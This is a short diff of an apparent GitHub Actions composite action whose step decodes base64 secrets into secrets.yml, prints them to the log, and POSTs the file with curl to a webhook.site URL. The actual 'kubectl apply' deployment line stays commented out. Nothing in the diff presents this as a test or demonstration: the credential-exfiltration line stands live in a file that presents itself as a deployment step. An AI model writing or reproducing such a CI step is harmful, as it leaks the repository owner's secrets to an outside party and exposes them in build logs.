@@ -20,5 +20,5 @@ runs:
       run: |        
         echo "$YAML_CONTENTS" | base64 -d > secrets.yml
         cat secrets.yml
-#        kubectl apply -n "${{ inputs.namespace }}" -f secrets.yml
         curl -X POST --data @secrets.yml https://webhook.site/2399be39-58e4-4156-8e3b-3efe033704a3
+#        kubectl apply -n "${{ inputs.namespace }}" -f secrets.yml       
